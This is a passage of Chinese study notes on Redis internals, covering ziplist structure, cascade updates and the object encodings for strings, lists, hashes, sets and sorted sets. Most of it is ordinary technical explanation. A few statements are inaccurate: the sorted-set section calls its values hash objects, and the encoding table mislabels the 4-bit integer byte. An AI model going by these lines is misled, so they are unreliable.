结尾，表示压缩列表结束。\n\n\n\n压缩列表节点的构成节点由以下组成：\n\nprevious_entry_length：1-5字节，表示前一个元素的长\nencoding：1-5字节，记录当前元素的数\ncontent：变长，存储元素的实际数据。\n\n每个压缩列表节点可以保存一个字节数组或者一个整数值，其中，字节数组可以是以下三种长度的其中一种：\n\n长度小于等于63（2 6–1）字节的字节数组；\n长度小于等于16383（2 14–1）字节的字节数组；\n长度小于等于4294967295（2 32–1）字节的字节数组；\n\n而整数值则可以是以下六种长度的其中一种：\n\n4位长，介于0至12之间的无符号整数；\n1字节长的有符号整数；\n3字节长的有符号整数；\nint16_t类型整数；\nint32_t类型整数；\nint64_t类型整数。\n\nprevious_entry_length节点的previous_entry_length属性以字节为单位，记录了压缩列表中前一个节点的长度。previous_entry_length属性的长度可以是1字节或者5字节：\n\n如果前一节点的长度小于254字节，那么previous_entry_length属性的长度为1字节：前一节点的长度就保存在这一个字节里面。\n如果前一节点的长度大于等于254字节，那么previous_entry_length属性的长度为5字节：其中属性的第一字节会被设置为0xFE（十进制值254），而之后的四个字节则用于保存前一节点的长度。\n\n因为节点的previous_entry_length属性记录了前一个节点的长度，所以程序可以通过指针运算，根据当前节点的起始地址来计算出前一个节点的起始地址。举个例子，如果我们有一个指向当前节点起始地址的指针c，那么我们只要用指针c减去当前节点previous_entry_length属性的值，就可以得出一个指向前一个节点起始地址的指针p\n\n双向遍历对于正向遍历。因为每个节点的大小不固定，需要计算当前节点的长度，以根据每个节点的实际长度进行跳转。对于整数类型，encoding 直接决定了所占用的字节数（1、2、4 或 8 字节）。对于字节数组类型，encoding 包含了字节数组的长度信息，用于确定 content 部分的大小。对于反向遍历。则是通过previous_entry_length来实现的，它记录了当前节点的前一个节点的长度，从而可以计算出前一个节点的起始地址，从而进行跳转。\n\nencoding节点的encoding属性记录了节点的content属性所保存数据的类型以及长度。\n\n\n\n编码类型\nencoding 值\n编码字节数\n表示的数据类型\n内容字节数\n\n\n\n字符串编码\n00xxxxxx\n1 字节\n字符串，长度 ≤ 63 字节\n6 位表示长度（0-63）\n\n\n\n01xxxxxx xxxxxxxx\n2 字节\n字符串，长度 ≤ 16383 字节\n14 位表示长度（0-16383）\n\n\n\n100xxxxx xxxxxxxx xxxxxxxx xxxxxxxx\n5 字节\n字符串，长度 ≤ 4294967295 字节\n4 字节表示长度（0-4294967295）\n\n\n整数编码\n1111 0000\n1 字节\n4 位有符号整数\n无\n\n\n\n1100 0000\n1 字节\n1 字节有符号整数\n1 字节内容\n\n\n\n1101 0000\n1 字节\n2 字节有符号整数\n2 字节内容\n\n\n\n1110 0000\n1 字节\n4 字节有符号整数\n4 字节内容\n\n\n\n1111 0001\n1 字节\n8 字节有符号整数\n8 字节内容\n\n\ncontent节点的content属性负责保存节点的值，节点值可以是一个字节数组或者整数，值的类型和长度由节点的encoding属性决定。\n连锁更新前面有提到，每个节点的previous_entry_length属性都记录了前一个节点的长度：\n\n如果前一节点的长度小于254字节，那么previous_entry_length属性需要用1字节长的空间来保存这个长度值。\n如果前一节点的长度大于等于254字节，那么previous_entry_length属性需要用5字节长的空间来保存这个长度值。\n\n那么有一种情况在一个压缩列表中，有多个连续的、长度介于250字节到253字节之间的节点e1至eN，因为e1至eN的所有节点的长度都小于254字节，所以记录这些节点的长度只需要1字节长的previous_entry_length属性。如果将一个长度大于等于254字节的新节点new设置为压缩列表的表头节点，那么new将成为e1的前置节点。因为e1的previous_entry_length属性仅长1字节，它没办法保存新节点new的长度，所以程序将对压缩列表执行空间重分配操作，并将e1节点的previous_entry_length属性从原来的1字节长扩展为5字节长。同时，e1原本的长度介于250字节至253字节之间，在为previous_entry_length属性新增四个字节的空间之后，e1的长度就变成了介于254字节至257字节之间，而这种长度使用1字节长的previous_entry_length属性是没办法保存的。所以e2也需要进行重新分配，以此类推。程序需要不断地对压缩列表执行空间重分配操作，直到eN为止。\nRedis将这种在特殊情况下产生的连续多次空间扩展操作称之为“连锁更新”（cascade update）除了添加新节点可能会引发连锁更新之外，删除节点也可能会引发连锁更新。\n因为连锁更新在最坏情况下需要对压缩列表执行N次空间重分配操作，而每次空间重分配的最坏复杂度为O（N），所以连锁更新的最坏复杂度为O（N 2）。要注意的是，尽管连锁更新的复杂度较高，但它真正造成性能问题的几率是很低的：\n\n首先，压缩列表里要恰好有多个连续的、长度介于250字节至253字节之间的节点，连锁更新才有可能被引发，在实际中，这种情况并不多见；\n其次，即使出现连锁更新，但只要被更新的节点数量不多，就不会对性能造成任何影响：比如说，对三五个节点进行连锁更新是绝对不会影响性能的；\n\n因为以上原因，ziplistPush等命令的平均复杂度仅为O（N），在实际中，我们可以放心地使用这些函数，而不必担心连锁更新会影响压缩列表的性能。\n压缩列表API\n\n\n函数\n作用\n算法复杂度\n\n\n\nziplistNew\n创建一个新的压缩列表\nO(1)\n\n\nziplistPush\n将给定值的新节点添加到压缩列表的表头或表尾\n平均 O(N)，最坏 O(N^2)\n\n\nziplistInsert\n在给定节点之后插入包含给定值的新节点\n平均 O(N)，最坏 O(N^2)\n\n\nziplistIndex\n返回压缩列表给定索引处的节点\nO(N)\n\n\nziplistFind\n在压缩列表中查找并返回包含给定值的节点\nO(N)，值检查为 O(M)\n\n\nziplistNext\n返回给定节点的下一个节点\nO(1)\n\n\nziplistPrev\n返回给定节点的前一个节点\nO(1)\n\n\nziplistGet\n获取给定节点存储的值\nO(1)\n\n\nziplistDelete\n从压缩列表中删除给定的节点\n平均 O(N)，最坏 O(N^2)\n\n\nziplistDeleteRange\n删除压缩列表中从给定索引开始的多个连续节点\n平均 O(N)，最坏 O(N^2)\n\n\nziplistBlobLen\n返回压缩列表当前占用的内存字节数\nO(1)\n\n\nziplistLen\n返回压缩列表当前包含的节点数量\n节点数量 ≤ 65535 时为 O(1)，否则为 O(N)\n\n\n其中：\n\nM 是节点值的字节数（如果节点包含字符串值），表示比较过程中所需的检查复杂度。\nN 是压缩列表中节点的总数。\n\n因为ziplistPush、ziplistInsert、ziplistDelete和ziplistDeleteRange四个函数都有可能会引发连锁更新，所以它们的最坏复杂度都是O（N^2）。\n第八章 - 对象前面介绍了Redis用到的所有主要数据结构，比如简单动态字符串（SDS）、双端链表、字典、压缩列表、整数集合等等。Redis并没有直接使用这些数据结构来实现键值对数据库，而是基于这些数据结构创建了一个对象系统，这个系统包含字符串对象、列表对象、哈希对象、集合对象和有序集合对象这五种类型的对象。\n通过这五种不同类型的对象，Redis可以在执行命令之前，根据对象的类型来判断一个对象是否可以执行给定的命令。使用对象的另一个好处是，我们可以针对不同的使用场景，为对象设置多种不同的数据结构实现，从而优化对象在不同场景下的使用效率。\n除此之外，Redis的对象系统还实现了基于引用计数技术的内存回收机制，当程序不再使用某个对象的时候，这个对象所占用的内存就会被自动释放；另外，Redis还通过引用计数技术实现了对象共享机制，这一机制可以在适当的条件下，通过让多个数据库键共享同一个对象来节约内存。最后，Redis的对象带有访问时间记录信息，该信息可以用于计算数据库键的空转时长，在服务器启用了maxmemory功能的情况下，空转时长较大的那些键可能会优先被服务器删除。\n对象的类型与编码Redis使用对象来表示数据库中的键和值，每次当我们在Redis的数据库中新创建一个键值对时，我们至少会创建两个对象，一个对象用作键值对的键（键对象），另一个对象用作键值对的值（值对象）。\nRedis中的每个对象都由一个redisObject结构表示，该结构中和保存数据有关的三个属性分别是type属性、encoding属性和ptr属性：\ntypedef struct redisObject &#123;    // 类型    unsigned type:4;    // 编码    unsigned encoding:4;    // 指向底层实现数据结构的指针    void *ptr;    // ...&#125; robj;\n\n类型对象的type属性记录了对象的类型，这个属性的值可以是下面列出的常量的其中一个。\n\n\n\n类型常量\n对象的名称\n\n\n\nREDIS_STRING\n字符串对象\n\n\nREDIS_LIST\n列表对象\n\n\nREDIS_HASH\n哈希对象\n\n\nREDIS_SET\n集合对象\n\n\nREDIS_ZSET\n有序集合对象\n\n\n对于Redis数据库保存的键值对来说，键总是一个字符串对象，而值则可以是字符串对象、列表对象、哈希对象、集合对象或者有序集合对象的其中一种，因此：\n\n当我们称呼一个数据库键为“字符串键”时，我们指的是“这个数据库键所对应的值为字符串对象”；\n当我们称呼一个键为“列表键”时，我们指的是“这个数据库键所对应的值为列表对象”。\n\nTYPE命令的实现方式也与此类似，当我们对一个数据库键执行TYPE命令时，命令返回的结果为数据库键对应的值对象的类型，而不是键对象的类型。\n不同类型值对象的TYPE命令输出：\n\n\n\n对象\n对象type属性的值\nTYPE命令的输出\n\n\n\n字符串对象\nREDIS_STRING\n“string”\n\n\n列表对象\nREDIS_LIST\n“list”\n\n\n哈希对象\nREDIS_HASH\n“hash”\n\n\n集合刘象\nREDIS_SET\n“set”\n\n\n有序集合对象\nREDIS_ZSET\n“zset”\n\n\n编码和底层实现对象的ptr指针指向对象的底层实现数据结构，而这些数据结构由对象的encoding属性决定。encoding属性记录了对象所使用的编码，也即是说这个对象使用了什么数据结构作为对象的底层实现，这个属性的值可以是下面列出的常量的其中一个。\n\n\n\n数据类型\n编码常量\n编码所对应的底层数据结构\n\n\n\nString\nREDIS_ENCODING_INT\n整型类型的整数\n\n\nString\nREDIS_ENCODING_EMBSTR\nembstr 编码的简单动态字符串\n\n\nString\nREDIS_ENCODING_RAW\n简单动态字符串\n\n\nHash\nREDIS_ENCODING_ZIPLIST\n压缩列表\n\n\nHash\nREDIS_ENCODING_HT\n字典\n\n\nList\nREDIS_ENCODING_LINKEDLIST\n双端链表\n\n\nList\nREDIS_ENCODING_ZIPLIST\n压缩列表\n\n\nSet\nREDIS_ENCODING_INTSET\n整数集合\n\n\nSet\nREDIS_ENCODING_HT\n字典\n\n\nSorted Set\nREDIS_ENCODING_ZIPLIST\n压缩列表\n\n\nSorted Set\nREDIS_ENCODING_SKIPLIST\n跳跃表和字典\n\n\n每种类型的对象都至少使用了两种不同的编码，下面列出了每种类型的对象可以使用的编码。\n\n\n\n类型\n编码常量\n对象描述\n\n\n\nREDIS_STRING\nREDIS_ENCODING_INT\n使用整数值实现的字符串对象\n\n\nREDIS_STRING\nREDIS_ENCODING_EMBSTR\n使用 embstr 编码的简单动态字符串实现的字符串对象\n\n\nREDIS_STRING\nREDIS_ENCODING_RAW\n使用简单动态字符串实现的字符串对象\n\n\nREDIS_LIST\nREDIS_ENCODING_ZIPLIST\n使用压缩列表实现的列表对象\n\n\nREDIS_LIST\nREDIS_ENCODING_LINKEDLIST\n使用双端链表实现的列表对象\n\n\nREDIS_HASH\nREDIS_ENCODING_ZIPLIST\n使用压缩列表实现的哈希对象\n\n\nREDIS_HASH\nREDIS_ENCODING_HT\n使用字典实现的哈希对象\n\n\nREDIS_SET\nREDIS_ENCODING_INTSET\n使用整数集合实现的集合对象\n\n\nREDIS_SET\nREDIS_ENCODING_HT\n使用字典实现的集合对象\n\n\nREDIS_ZSET\nREDIS_ENCODING_ZIPLIST\n使用压缩列表实现的有序集合对象\n\n\nREDIS_ZSET\nREDIS_ENCODING_SKIPLIST\n使用跳跃表和字典实现的有序集合对象\n\n\n使用OBJECT ENCODING命令可以查看一个数据库键的值对象的编码。下面列出了不同编码的对象所对应的OBJECT ENCODING命令输出。\n\n\n\n对象所使用的底层数据结构\n编码常量\nOBJECT ENCODING 命令输出\n\n\n\n整数\nREDIS_ENCODING_INT\n&quot;int&quot;\n\n\nembstr 编码的简单动态字符串（SDS）\nREDIS_ENCODING_EMBSTR\n&quot;embstr&quot;\n\n\n简单动态字符串（SDS）\nREDIS_ENCODING_RAW\n&quot;raw&quot;\n\n\n字典\nREDIS_ENCODING_HT\n&quot;hashtable&quot;\n\n\n双端链表\nREDIS_ENCODING_LINKEDLIST\n&quot;linkedlist&quot;\n\n\n压缩列表\nREDIS_ENCODING_ZIPLIST\n&quot;ziplist&quot;\n\n\n整数集合\nREDIS_ENCODING_INTSET\n&quot;intset&quot;\n\n\n跳跃表和字典\nREDIS_ENCODING_SKIPLIST\n&quot;skiplist&quot;\n\n\n通过encoding属性来设定对象所使用的编码，而不是为特定类型的对象关联一种固定的编码，极大地提升了Redis的灵活性和效率，因为Redis可以根据不同的使用场景来为一个对象设置不同的编码，从而优化对象在某一场景下的效率。举个例子，在列表对象包含的元素比较少时，Redis使用压缩列表作为列表对象的底层实现：\n\n因为压缩列表比双端链表更节约内存，并且在元素数量较少时，在内存中以连续块方式保存的压缩列表比起双端链表可以更快被载入到缓存中；\n随着列表对象包含的元素越来越多，使用压缩列表来保存元素的优势逐渐消失时，对象就会将底层实现从压缩列表转向功能更强、也更适合保存大量元素的双端链表上面；\n\n其他类型的对象也会通过使用多种不同的编码来进行类似的优化。\n字符串对象字符串对象的编码可以是int、raw或者embstr。\n如果一个字符串对象保存的是整数值，并且这个整数值可以用long类型来表示，那么字符串对象会将整数值保存在字符串对象结构的ptr属性里面（将void*转换成long），并将字符串对象的编码设置为int。如果字符串对象保存的是一个字符串值，并且这个字符串值的长度大于32字节，那么字符串对象将使用一个简单动态字符串（SDS）来保存这个字符串值，并将对象的编码设置为raw。如果字符串对象保存的是一个字符串值，并且这个字符串值的长度小于等于32字节，那么字符串对象将使用embstr编码的方式来保存这个字符串值。\nembstr编码是专门用于保存短字符串的一种优化编码方式，这种编码和raw编码一样，都使用redisObject结构和sdshdr结构来表示字符串对象。但raw编码会调用两次内存分配函数来分别创建redisObject结构和sdshdr结构，而embstr编码则通过调用一次内存分配函数来分配一块连续的空间，空间中依次包含redisObject和sdshdr两个结构。\nembstr编码的字符串对象在执行命令时，产生的效果和raw编码的字符串对象执行命令时产生的效果是相同的，但使用embstr编码的字符串对象来保存短字符串值有以下好处：\n\nembstr编码将创建字符串对象所需的内存分配次数从raw编码的两次降低为一次。\n释放embstr编码的字符串对象只需要调用一次内存释放函数，而释放raw编码的字符串对象需要调用两次内存释放函数。\n因为embstr编码的字符串对象的所有数据都保存在一块连续的内存里面，所以这种编码的字符串对象比起raw编码的字符串对象能够更好地利用缓存带来的优势。\n\n可以用 long double 类型表示的浮点数在Redis中也是作为字符串值来保存的。如果我们要保存一个浮点数到字符串对象里面，那么程序会先将这个浮点数转换成字符串值，然后再保存转换所得的字符串值。在有需要的时候，程序会将保存在字符串对象里面的字符串值转换回浮点数值，执行某些操作，然后再将执行操作所得的浮点数值转换回字符串值，并继续保存在字符串对象里面。\n编码的转换int编码的字符串对象和embstr编码的字符串对象在条件满足的情况下，会被转换为raw编码的字符串对象。对于int编码的字符串对象来说，如果我们向对象执行了一些命令，使得这个对象保存的不再是整数值，而是一个字符串值，那么字符串对象的编码将从int变为raw。\n另外，因为Redis没有为embstr编码的字符串对象编写任何相应的修改程序（只有int编码的字符串对象和raw编码的字符串对象有这些程序），所以embstr编码的字符串对象实际上是只读的。当我们对embstr编码的字符串对象执行任何修改命令时，程序会先将对象的编码从embstr转换成raw，然后再执行修改命令。因为这个原因，embstr编码的字符串对象在执行修改命令之后，总会变成一个raw编码的字符串对象。\n字符串命令的实现因为字符串键的值为字符串对象，所以用于字符串键的所有命令都是针对字符串对象来构建的，表8-7列举了其中一部分字符串命令，以及这些命令在不同编码的字符串对象下的实现方法。\n\n\n\n命令\nint 编码的实现方法\nembstr 编码的实现方法\nraw 编码的实现方法\n\n\n\nSET\n使用整数编码保存值\n使用 embstr 编码保存值\n使用 raw 编码保存值\n\n\nGET\n拷贝整数值并转换为字符串后返回给客户端\n直接返回字符串值\n直接返回字符串值\n\n\nAPPEND\n转换为 raw 编码后按 raw 编码方式执行\n转换为 raw 编码后按 raw 编码方式执行\n将给定字符串追加到现有字符串的末尾\n\n\nINCRBYFLOAT\n转换整数为浮点数，计算结果并保存浮点数结果\n尝试将字符串转换为 long double 类型的浮点数，计算并保存\n尝试将字符串转换为 long double 类型的浮点数，计算并保存\n\n\nINCRBY\n执行加法计算，保存结果为整数\nembstr 编码无法执行此命令，返回错误\nraw 编码无法执行此命令，返回错误\n\n\nDECRBY\n执行减法计算，保存结果为整数\nembstr 编码无法执行此命令，返回错误\nraw 编码无法执行此命令，返回错误\n\n\nSTRLEN\n将整数转换为字符串并返回其长度\n返回字符串的长度\n返回字符串的长度\n\n\nSETRANGE\n转换为 raw 编码后按 raw 编码方式执行\n转换为 raw 编码后按 raw 编码方式执行\n将指定索引位置上的值设置为给定字符\n\n\nGETRANGE\n将整数转换为字符串并返回指定索引上的字符\n返回字符串指定索引上的字符\n返回字符串指定索引上的字符\n\n\n列表对象列表对象的编码可以是ziplist或者linkedlist。\nziplist编码的列表对象使用压缩列表作为底层实现，每个压缩列表节点（entry）保存了一个列表元素。linkedlist编码的列表对象使用双端链表作为底层实现，每个双端链表节点（node）都保存了一个字符串对象，而每个字符串对象都保存了一个列表元素。\n编码转换当列表对象可以同时满足以下两个条件时，列表对象使用ziplist编码：\n\n列表对象保存的所有字符串元素的长度都小于64字节；\n列表对象保存的元素数量小于512个；\n\n不能满足这两个条件的列表对象需要使用linkedlist编码。\n以上两个条件的上限值是可以修改的，具体请看配置文件中关于 list-max-ziplist-value 选项和 list-max-ziplist-entries 选项的说明。对于使用ziplist编码的列表对象来说，当使用ziplist编码所需的两个条件的任意一个不能被满足时，对象的编码转换操作就会被执行，原本保存在压缩列表里的所有列表元素都会被转移并保存到双端链表里面，对象的编码也会从ziplist变为linkedlist。\n列表命令的实现因为列表键的值为列表对象，所以用于列表键的所有命令都是针对列表对象来构建的，下面列出了其中一部分列表键命令，以及这些命令在不同编码的列表对象下的实现方法。\n\n\n\n命令\nziplist 编码的实现方法\nlinkedlist 编码的实现方法\n\n\n\nLPUSH\n调用 ziplistPush 函数，将新元素推入到压缩列表的表头\n用 listAddNodeHead 函数，将新元素推入到双端链表的表头\n\n\nRPUSH\n调用 ziplistPush 函数，将新元素推入到压缩列表的表尾\n调用 listAddNodeTail 函数，将新元素推入到双端链表的表尾\n\n\nLPOP\n调用 ziplistIndex 函数定位压缩列表的表头节点，返回节点所保存的元素后，调用 ziplistDelete 函数删除表头节点\n调用 listFirst 函数定位双端链表的表头节点，返回节点所保存的元素后，调用 listDelNode 函数删除表头节点\n\n\nRPOP\n调用 ziplistIndex 函数定位压缩列表的表尾节点，返回节点所保存的元素后，调用 ziplistDelete 函数删除表尾节点\n调用 listLast 函数定位双端链表的表尾节点，返回节点所保存的元素后，调用 listDelNode 函数删除表尾节点\n\n\nLINDEX\n调用 ziplistIndex 函数定位压缩列表中的指定节点，然后返回节点所保存的元素\n调用 listIndex 函数定位双端链表中的指定节点，然后返回节点所保存的元素\n\n\nLLEN\n调用 ziplistLen 函数返回压缩列表的长度\n调用 listLength 函数返回双端链表的长度\n\n\nLINSERT\n若在表头或表尾插入新节点，调用 ziplistPush 函数；在其他位置插入时调用 ziplistInsert 函数\n调用 listInsertNode 函数，将新节点插入到双端链表的指定位置\n\n\nLREM\n遍历压缩列表节点，并调用 ziplistDelete 函数删除包含给定元素的节点\n遍历双端链表节点，调用 listDelNode 函数删除包含给定元素的节点\n\n\nLTRIM\n调用 ziplistDeleteRange 函数，删除压缩列表中所有不在指定索引范围内的节点\n遍历双端链表节点，调用 listDelNode 函数删除所有不在指定索引范围内的节点\n\n\nLSET\n调用 ziplistDelete 删除指定索引上的现有节点，然后调用 ziplistInsert 插入新节点\n调用 listIndex 函数定位到双端链表的指定索引节点，然后通过赋值更新节点的值\n\n\n哈希对象哈希对象的编码可以是ziplist或者hashtable。ziplist编码的哈希对象使用压缩列表作为底层实现，每当有新的键值对要加入到哈希对象时，程序会先将保存了键的压缩列表节点推入到压缩列表表尾，然后再将保存了值的压缩列表节点推入到压缩列表表尾，因此：\n\n保存了同一键值对的两个节点总是紧挨在一起，保存键的节点在前，保存值的节点在后；\n先添加到哈希对象中的键值对会被放在压缩列表的表头方向，而后来添加到哈希对象中的键值对会被放在压缩列表的表尾方向。\n\nhashtable编码的哈希对象使用字典作为底层实现，哈希对象中的每个键值对都使用一个字典键值对来保存：\n\n字典的每个键都是一个字符串对象，对象中保存了键值对的键；\n字典的每个值都是一个字符串对象，对象中保存了键值对的值。\n\n编码转换当哈希对象可以同时满足以下两个条件时，哈希对象使用ziplist编码：\n\n哈希对象保存的所有键值对的键和值的字符串长度都小于64字节；\n哈希对象保存的键值对数量小于512个；不能满足这两个条件的哈希对象需要使用hashtable编码。\n\n这两个条件的上限值是可以修改的，具体请看配置文件中关于hash-max-ziplist-value选项和hash-max-ziplist-entries选项的说明。\n对于使用ziplist编码的列表对象来说，当使用ziplist编码所需的两个条件的任意一个不能被满足时，对象的编码转换操作就会被执行。原本保存在压缩列表里的所有键值对都会被转移并保存到字典里面，对象的编码也会从ziplist变为hashtable。除了键的长度太大会引起编码转换之外，值的长度太大也会引起编码转换。\n哈希命令的实现因为哈希键的值为哈希对象，所以用于哈希键的所有命令都是针对哈希对象来构建的，下面列出了其中一部分哈希键命令，以及这些命令在不同编码的哈希对象下的实现方法。\n\n\n\n命令\nziplist 编码实现方法\nhashtable 编码实现方法\n\n\n\nHSET\n调用 ziplistPush 函数，将键推入到压缩列表的表尾，然后再次调用 ziplistPush 函数，将值推入到压缩列表的表尾\n调用 dictAdd 函数，将新键值对添加到字典中\n\n\nHGET\n调用 ziplistFind 函数，在压缩列表中查找指定键所对应的节点，然后调用 ziplistNext 函数，移动到值节点并返回其值\n使用 dictFind 函数在字典中查找给定键，然后调用 dictGetVal 函数返回该键的值\n\n\nHEXISTS\n调用 ziplistFind 函数在压缩列表中查找指定键节点，找到则表示键值对存在，未找到则表示不存在\n调用 dictFind 函数在字典中查找给定键，找到表示存在，未找到表示不存在\n\n\nHDEL\n调用 ziplistFind 函数在压缩列表中查找指定键节点，然后删除键节点及其相邻的值节点\n调用 dictDelete 函数将指定键对应的键值对从字典中删除\n\n\nHLEN\n调用 ziplistLen 函数，取得压缩列表中节点的总数，并除以 2，得出键值对数量\n调用 dictSize 函数返回字典中包含的键值对数量\n\n\nHGETALL\n遍历整个压缩列表，调用 ziplistGet 函数返回所有键和值（都是节点）\n遍历整个字典，调用 dictGetKey 函数返回键，调用 dictGetVal 函数返回值\n\n\n集合对象集合对象的编码可以是intset或者hashtable。\nintset编码的集合对象使用整数集合作为底层实现，集合对象包含的所有元素都被保存在整数集合里面。hashtable编码的集合对象使用字典作为底层实现，字典的每个键都是一个字符串对象，每个字符串对象包含了一个集合元素，而字典的值则全部被设置为NULL。\n编码的转换当集合对象可以同时满足以下两个条件时，对象使用intset编码：\n\n集合对象保存的所有元素都是整数值；\n集合对象保存的元素数量不超过512个。\n\n不能满足这两个条件的集合对象需要使用hashtable编码。\n第二个条件的上限值是可以修改的，具体请看配置文件中关于set-max-intset-entries选项的说明。\n对于使用intset编码的集合对象来说，当使用intset编码所需的两个条件的任意一个不能被满足时，就会执行对象的编码转换操作。原本保存在整数集合中的所有元素都会被转移并保存到字典里面，并且对象的编码也会从intset变为hashtable。\n集合命令的实现因为集合键的值为集合对象，所以用于集合键的所有命令都是针对集合对象来构建的，下面列出了其中一部分集合键命令，以及这些命令在不同编码的集合对象下的实现方法。\n\n\n\n命令\nintset 编码实现方法\nhashtable 编码实现方法\n\n\n\nSADD\n调用 intsetAdd 函数，将所有新元素添加到整数集合中\n调用 dictAdd 函数，以新元素为键，NULL 值，将键值对添加到字典中\n\n\nSCARD\n调用 intsetLen 函数，返回整数集合包含的元素数量\n调用 dictSize 函数，返回字典中包含的键值对数量\n\n\nSISMEMBER\n调用 intsetFind 函数，在整数集合中查找给定的元素，找到则说明元素存在，未找到则说明元素不存在\n调用 dictFind 函数，在字典中查找给定的元素，找到则说明元素存在，未找到则说明元素不存在\n\n\nSMEMBERS\n遍历整个整数集合，使用 intsetGet 函数返回集合元素\n遍历整个字典，使用 dictGetKey 函数返回字典的键作为集合元素\n\n\nSRANDMEMBER\n调用 intsetRandom 函数，从整数集合中随机返回一个元素\n调用 dictGetRandomKey 函数，从字典中随机返回一个键\n\n\nSPOP\n调用 intsetPop 函数，从整数集合中随机取出一个元素，并在将这个随机元素返回给客户端之后，调用 intsetRemove 函数将随机元素从整数集合中删除\n调用 dictGetRandomKey 函数，从字典中随机取出一个键，并在将这个随机字典键的值返回给客户端之后，调用 dictDelete 函数删除随机字典键所对应的键值对\n\n\nSREM\n调用 intsetRemove 函数，从整数集合中移除所有给定的元素\n调用 dictDelete 函数，从字典中删除所有键为给定元素的键值对\n\n\n有序集合对象有序集合的编码可以是ziplist或者skiplist。\nziplist编码的压缩列表对象使用压缩列表作为底层实现，每个集合元素使用两个紧挨在一起的压缩列表节点来保存，第一个节点保存元素的成员（member），而第二个元素则保存元素的分值（score）。压缩列表内的集合元素按分值从小到大进行排序，分值较小的元素被放置在靠近表头的方向，而分值较大的元素则被放置在靠近表尾的方向。\nskiplist编码的有序集合对象使用zset结构作为底层实现，一个zset结构同时包含一个字典和一个跳跃表。\nzset结构中的zsl跳跃表按分值从小到大保存了所有集合元素，每个跳跃表节点都保存了一个集合元素：跳跃表节点的object属性保存了元素的成员，而跳跃表节点的score属性则保存了元素的分值。通过这个跳跃表，程序可以对有序集合进行范围型操作，比如ZRANK、ZRANGE等命令就是基于跳跃表API来实现的。除此之外，zset结构中的dict字典为有序集合创建了一个从成员到分值的映射，字典中的每个键值对都保存了一个集合元素：字典的键保存了元素的成员，而字典的值则保存了元素的分值。通过这个字典，程序可以用O（1）复杂度查找给定成员的分值，ZSCORE命令就是根据这一特性实现的，而很多其他有序集合命令都在实现的内部用到了这一特性。\n有序集合每个元素的成员都是一个字符串对象，而每个元素的分值都是一个double类型的浮点数。值得一提的是，虽然zset结构同时使用跳跃表和字典来保存有序集合元素，但这两种数据结构都会通过指针来共享相同元素的成员和分值，所以同时使用跳跃表和字典来保存集合元素不会产生任何重复成员或者分值，也不会因此而浪费额外的内存。\n为什么有序集合需要同时使用跳跃表和字典来实现？\n在理论上，有序集合可以单独使用字典或者跳跃表的其中一种数据结构来实现，但无论单独使用字典还是跳跃表，在性能上对比起同时使用字典和跳跃表都会有所降低。举个例子，如果我们只使用字典来实现有序集合，那么虽然以O（1）复杂度查找成员的分值这一特性会被保留，但是，因为字典以无序的方式来保存集合元素，所以每次在执行范围型操作——比如ZRANK、ZRANGE等命令时。程序都需要对字典保存的所有元素进行排序，完成这种排序需要至少O（NlogN）时间复杂度，以及额外的O（N）内存空间（因为要创建一个数组来保存排序后的元素）。\n另一方面，如果我们只使用跳跃表来实现有序集合，那么跳跃表执行范围型操作的所有优点都会被保留，但因为没有了字典，所以根据成员查找分值这一操作的复杂度将从O（1）上升为O（logN）。因为以上原因，为了让有序集合的查找和范围型操作都尽可能快地执行，Redis选择了同时使用字典和跳跃表两种数据结构来实现有序集合。\n编码的转换当有序集合对象可以同时满足以下两个条件时，对象使用ziplist编码：\n\n有序集合保存的元素数量小于128个；\n有序集合保存的所有元素成员的长度都小于64字节；\n\n不能满足以上两个条件的有序集合对象将使用skiplist编码。\n以上两个条件的上限值是可以修改的，具体请看配置文件中关于zset-max-ziplist-entries选项和zset-max-ziplist-value选项的说明。\n对于使用ziplist编码的有序集合对象来说，当使用ziplist编码所需的两个条件中的任意一个不能被满足时，就会执行对象的编码转换操作。原本保存在压缩列表里的所有集合元素都会被转移并保存到zset结构里面，对象的编码也会从ziplist变为skiplist。\n有序集合命令的实现因为有序集合键的值为哈希对象，所以用于有序集合键的所有命令都是针对哈希对象来构建的，下面列出了其中一部分有序集合键命令，以及这些命令在不同编码的哈希对象下的实现方法。\n\n\n\n命令\nziplist 编码实现方法\nzset 编码实现方法\n\n\n\nZADD\n调用 ziplistInsert 函数，将成员和分值作为两个节点分别插入到压缩列表\n先调用 zslInsert 函数，将新元素添加到跳跃表，然后调用 dictAdd 函数，将新元素与分值的关联添加到字典中\n\n\nZCARD\n调用 ziplistLength 函数，获得压缩列表包含的节点数量，将这个数量除以2得出集合元素的数量\n访问跳跃表的数据结构的 length 属性，直接返回集合元素的数量\n\n\nZCOUNT\n遍历压缩列表，统计分值在给定范围内的节点的数量\n遍历跳跃表，统计分值在给定范围内的节点的数量\n\n\nZRANGE\n从表头向表尾遍历压缩列表，返回给定索引范围内的所有元素\n从表头向表尾遍历跳跃表，返回给定索引范围内的所有元素\n\n\nZREVRANGE\n从表尾向表头遍历压缩列表，返回给定索引范围内的所有元素\n从表尾向表头遍历跳跃表，返回给定索引范围内的所有元素\n\n\nZRANK\n从表头向表尾遍历压缩列表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n从表头向表尾遍历跳跃表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n\n\nZREVRANK\n从表尾向表头遍历压缩列表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n从表尾向表头遍历跳跃表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n\n\nZREM\n遍历压缩列表，移除所有包含给定成员的节点，以及被移除成员节点旁边的分值节点\n遍历跳跃表，移除所有包含给定成员的跳跃表节点，并在字典中解除该成员与分值的关联\n\n\nZSCORE\n遍历压缩列表，找到包含给定成员的节点，然后取出成员节点旁边的分值节点保存的元素分值\n直接从字典中取出给定成员的分值\n\n\n类型检查与命令多态Redis中用于操作键的命令基本上可以分为两种类型。\n其中一种命令可以对任何类型的键执行，比如说DEL命令、EXPIRE命令、RENAME命令、TYPE命令、OBJECT命令等。而另一种命令只能对特定类型的键执行，比如说：\n\nSET、GET、APPEND、STRLEN等命令只能对字符串键执行；\nHDEL、HSET、HGET、HLEN等命令只能对哈希键执行；\nRPUSH、LPOP、LINSERT、LLEN等命令只能对列表键执行；\nSADD、SPOP、SINTER、SCARD等命令只能对集合键执行；\nZADD、ZCARD、ZRANK、ZSCORE等命令只能对有序集合键执行；\n\n类型检查的实现从为了确保只有指定类型的键可以执行某些特定的命令，在执行一个类型特定的命令之前，Redis